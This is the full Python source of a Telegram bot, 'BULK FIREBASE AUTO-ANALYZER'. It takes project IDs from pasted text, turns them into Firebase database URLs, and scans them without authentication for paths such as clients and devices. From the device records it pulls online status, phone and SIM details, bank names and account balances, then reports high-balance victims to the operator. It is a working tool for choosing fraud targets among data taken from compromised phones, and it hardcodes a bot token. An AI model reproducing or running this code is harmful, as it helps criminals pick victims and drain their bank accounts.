#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, ConversationHandler,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "9278880278:AAGCqQni6je8B28TyMx7lI8poJ0ege8HXxw")
BOT_NAME = "BULK FIREBASE AUTO-ANALYZER ⚡"

# ============================
# FAST HTTP
# ============================
_http_session = requests.Session()
_adapter = HTTPAdapter(pool_connections=300, pool_maxsize=500, max_retries=Retry(total=0))
_http_session.mount("https://", _adapter)
_http_session.mount("http://", _adapter)

def fast_get(url, timeout=4):
    try:
        return _http_session.get(url, timeout=timeout)
    except Exception:
        return None

# ============================
# CONFIG
# ============================
CONFIG_FILE = "analyzer_config.json"
configs = {"users": {}, "firebases": []}

def load_configs():
    global configs
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                configs = json.load(f)
            configs.setdefault("users", {})
            configs.setdefault("firebases", [])
        except:
            pass

def save_configs():
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(configs, f, indent=2)
    except:
        pass

load_configs()

WAIT_BULK_URLS, WAIT_MIN_BAL = range(2)

# ============================
# 🔥 ORIGINAL DEVICE FIELD MAP (From your bot.py)
# ============================
DEVICE_FIELD_MAP = {
    "name": ["modelName", "model", "deviceName", "device_name", "name",
             "deviceModel", "device_model", "model_name", "phone_name"],
    "battery": ["battery", "batteryLevel", "battery_level", "bat",
                "battery_percent", "batteryPercentage", "power"],
    "status": ["status", "is_online", "isOnline", "online", "active",
               "connected", "state", "isActive", "is_active"],
    "phone": ["mobNo", "phone", "phoneNumber", "phone_number", "mobile",
              "mobileNumber", "number", "msisdn"],
    "sims": ["sims", "sim_info", "simInfo", "sim", "simCards", "sim_details"],
}

def get_field(data, field_type, default=None):
    if not isinstance(data, dict):
        return default
    for key in DEVICE_FIELD_MAP.get(field_type, []):
        if key in data and data[key] is not None:
            return data[key]
    return default

def is_online(info):
    status = get_field(info, "status")
    if status is None:
        return False
    if isinstance(status, bool):
        return status
    if isinstance(status, (int, float)):
        return status == 1
    if isinstance(status, str):
        return status.lower() in ["true", "online", "active", "connected", "1"]
    return False

def normalize_battery(battery):
    if battery is None:
        return "—"
    if isinstance(battery, (int, float)):
        return f"{int(battery)}%"
    s = str(battery).strip()
    if s.endswith("%"):
        return s
    if s.isdigit():
        return f"{s}%"
    return s

# ============================
# SMART URL EXTRACTION
# ============================
def extract_firebase_urls(text):
    if not text: return []
    urls = set()
    ignore_words = ["setup", "channel", "owner", "user", "url", "https", "http", 
                    "firebase", "data", "info", "status", "true", "false", "null", 
                    "json", "admin", "panel", "device", "open", "public", "restored", 
                    "store", "balance", "bot", "token", "chat", "id"]

    for m in re.finditer(r"https?://[a-zA-Z0-9\-_.]+\.(?:firebaseio\.com|firebasedatabase\.app)", text, re.IGNORECASE):
        u = m.group(0).rstrip("/")
        if any(fake in u.lower() for fake in ["channel.", "setup.", "owner.", "user."]):
            continue
        urls.add(u)

    for m in re.finditer(r"(?<![\w.\-/])([a-zA-Z0-9][a-zA-Z0-9\-]{3,50})(?![\w.\-/])", text):
        pid = m.group(1).lower()
        if pid in ignore_words or len(pid) < 5: continue
        if "default-rtdb" not in pid:
            urls.add(f"https://{pid}-default-rtdb.firebaseio.com")
            urls.add(f"https://{pid}-default-rtdb.firebasedatabase.app")
        else:
            urls.add(f"https://{pid}.firebaseio.com")
            urls.add(f"https://{pid}.firebasedatabase.app")
            clean = pid.replace("-default-rtdb", "")
            if clean not in ignore_words and len(clean) >= 5:
                urls.add(f"https://{clean}.firebaseio.com")
                urls.add(f"https://{clean}.firebasedatabase.app")

    return sorted(list(set([u for u in urls if ".firebaseio.com" in u or ".firebasedatabase.app" in u])))

# ============================
# DEEP SCAN & BALANCE LOGIC
# ============================
BALANCE_KEYS = ["balance", "avl_balance", "available_balance", "availableBalance",
                "accountBalance", "account_balance", "bankBalance", "bank_balance",
                "walletBalance", "wallet_balance", "amount", "avlBal", "avl_bal",
                "availableAmount", "avl_amount", "bank_avl_balance", "bal", "amt",
                "bank_balance_avl", "money", "avl_amt", "main_balance", "current_balance"]

BANK_KEYS = ["bankName", "bank_name", "bank", "bankname", "bankInfo",
             "bankTitle", "bank_title", "provider", "service_provider",
             "carrier", "network", "upi_bank", "upiBank"]

def extract_balance_from_node(node):
    if not isinstance(node, dict): return None, None
    bal, bank = None, None
    for k in BALANCE_KEYS:
        if k in node and node[k] is not None:
            try:
                b = float(str(node[k]).replace(",", "").replace("₹", ""))
                if b >= 0:
                    bal = b
                    break
            except: pass
    for k in BANK_KEYS:
        if k in node and isinstance(node[k], str) and len(node[k]) < 40:
            bank = node[k]
            break
    return bal, bank

def check_path(base_url, path):
    res = fast_get(f"{base_url}/{path}.json")
    if res and res.status_code == 200:
        try:
            j = res.json()
            if isinstance(j, dict) and len(j) > 0:
                # Validation using original format
                first_val = list(j.values())[0]
                if isinstance(first_val, dict):
                    if any(k in first_val for k in ["modelName", "model", "deviceName", "status", "sims", "is_online", "info"]):
                        return j
        except: pass
    return None

def scan_firebase_fast(base_url):
    paths = ["clients", "devices", "users", "data/clients", "data/devices", ""]
    with ThreadPoolExecutor(max_workers=6) as executor:
        futures = {executor.submit(check_path, base_url, p): p for p in paths}
        for future in as_completed(futures):
            data = future.result()
            if data:
                return data
    return {}

def analyze_single_fb(base_url, min_balance):
    result = {"url": base_url, "total": 0, "online": 0, "hits": []}
    data = scan_firebase_fast(base_url)
    
    if "" in data and isinstance(data[""], dict):
        data = data[""]

    result["total"] = len(data)
    
    for dev_id, info in data.items():
        if not isinstance(info, dict): 
            continue
            
        # Merge nested 'info' block just like your original bot
        if "info" in info and isinstance(info["info"], dict):
            info = {**info, **info["info"]}

        # Use original format to check online
        if not is_online(info):
            continue
            
        result["online"] += 1
        
        # Get details using original field map
        name = get_field(info, "name", "Unknown")
        battery = normalize_battery(get_field(info, "battery"))
        
        bal, bank = extract_balance_from_node(info)
        
        if bal is None:
            for k, v in info.items():
                if isinstance(v, dict):
                    b, bk = extract_balance_from_node(v)
                    if b is not None: bal, bank = b, (bank or bk)

        if bal is not None and bal >= min_balance:
            result["hits"].append({
                "device_id": dev_id,
                "name": str(name),
                "battery": battery,
                "bank": bank or "Unknown",
                "balance": bal,
            })
            
    return result

# ============================
# SEND HELPERS
# ============================
def send_raw(chat_id, text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}, timeout=6)
    except: pass

def send_long(chat_id, text):
    if len(text) <= 3800:
        send_raw(chat_id, text)
        return
    for i in range(0, len(text), 3800):
        send_raw(chat_id, text[i:i+3800])
        time.sleep(0.2)

# ============================
# COMMANDS
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        f"⚡ <b>{BOT_NAME}</b> ⚡\n\n"
        f"/addfb — Paste ANY mix text/URLs\n"
        f"/analyze — Find 2K+ Balance (Turbo)\n"
        f"/setmin — Change min balance\n"
        f"/listfb — View saved URLs\n"
        f"/delfb — Delete all URLs\n\n"
        f"✅ Original Device Format + Turbo Scan"
    )
    await update.message.reply_text(msg, parse_mode="HTML")

async def addfb_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📥 Paste setup texts, IDs or URLs:\n/cancel to abort")
    return WAIT_BULK_URLS

async def addfb_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    urls = extract_firebase_urls(update.message.text)
    if not urls:
        await update.message.reply_text("❌ No valid Firebase URLs found. Try again.")
        return WAIT_BULK_URLS

    existing = {f["url"] for f in configs["firebases"]}
    added = 0
    for u in urls:
        if u not in existing:
            configs["firebases"].append({"url": u})
            added += 1
    save_configs()
    await update.message.reply_text(f"✅ Added {added} new firebases.\nUse /analyze to check.")
    return ConversationHandler.END

async def addfb_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

async def listfb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not configs["firebases"]:
        await update.message.reply_text("❌ Empty. Use /addfb")
        return
    text = f"📋 <b>{len(configs['firebases'])} Firebases:</b>\n\n"
    for i, f in enumerate(configs["firebases"][:30], 1):
        text += f"{i}. <code>{f['url']}</code>\n"
    if len(configs["firebases"]) > 30:
        text += f"\n...and {len(configs['firebases'])-30} more"
    send_long(update.effective_chat.id, text)

async def delfb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    configs["firebases"] = []
    save_configs()
    await update.message.reply_text("✅ All firebases cleared.")

async def setmin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    cur = configs["users"].get(uid, {}).get("min_balance", 2000)
    await update.message.reply_text(f"Current Min: <b>{cur}</b>\nSend new value:", parse_mode="HTML")
    return WAIT_MIN_BAL

async def setmin_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        val = float(update.message.text.strip())
        uid = str(update.effective_user.id)
        configs["users"].setdefault(uid, {})["min_balance"] = val
        save_configs()
        await update.message.reply_text(f"✅ Min balance set to <b>{val}</b>", parse_mode="HTML")
    except:
        await update.message.reply_text("❌ Invalid number.")
        return WAIT_MIN_BAL
    return ConversationHandler.END

async def setmin_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

async def analyze_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fbs = configs["firebases"]
    if not fbs:
        await update.message.reply_text("❌ No firebases. Use /addfb")
        return

    uid = str(update.effective_user.id)
    chat_id = update.effective_chat.id
    min_bal = configs["users"].get(uid, {}).get("min_balance", 2000)

    await update.message.reply_text(f"⚡ Turbo Scanning {len(fbs)} firebases...\n⏳ Please wait...")

    def run():
        hits = []
        summary = []
        
        # 30 Firebases at once
        with ThreadPoolExecutor(max_workers=30) as executor:
            future_to_url = {executor.submit(analyze_single_fb, f["url"], min_bal): f["url"] for f in fbs}
            
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    res = future.result()
                    summary.append(f"<code>{url}</code> → 🟢 {res['online']} online | 💰 {len(res['hits'])} hits")
                    for h in res["hits"]:
                        hits.append({**h, "url": url})
                except Exception:
                    summary.append(f"<code>{url}</code> → ❌ Error")

        send_raw(chat_id, "📊 <b>Scan Complete!</b>\n\n" + "\n".join(summary[:20]) + ("\n..." if len(summary)>20 else ""))
        time.sleep(0.2)

        if not hits:
            send_raw(chat_id, f"❌ No devices found with balance ≥ {min_bal}")
            return

        hits.sort(key=lambda x: x["balance"], reverse=True)
        send_raw(chat_id, f"💰 <b>FOUND {len(hits)} DEVICES (≥{min_bal})</b>\nTap to copy 👇")
        
        for i, h in enumerate(hits, 1):
            block = (
                f"<b>#{i} — {h['name']}</b>\n"
                f"🌐 <code>{h['url']}</code>\n"
                f"🆔 <code>{h['device_id']}</code>\n"
                f"🏦 Bank: <b>{h['bank']}</b>\n"
                f"💰 Balance: <code>{h['balance']:,.2f}</code>\n"
                f"🔋 {h['battery']}"
            )
            send_raw(chat_id, block)
            time.sleep(0.1) 

    threading.Thread(target=run, daemon=True).start()

# ============================
# MAIN
# ============================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("addfb", addfb_start)],
        states={WAIT_BULK_URLS: [MessageHandler(filters.TEXT & ~filters.COMMAND, addfb_input)]},
        fallbacks=[CommandHandler("cancel", addfb_cancel)],
    ))
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("setmin", setmin_start)],
        states={WAIT_MIN_BAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setmin_input)]},
        fallbacks=[CommandHandler("cancel", setmin_cancel)],
    ))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("listfb", listfb))
    app.add_handler(CommandHandler("delfb", delfb))
    app.add_handler(CommandHandler("analyze", analyze_command))

    logger.info("🤖 Ultra-Fast Bot is running...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()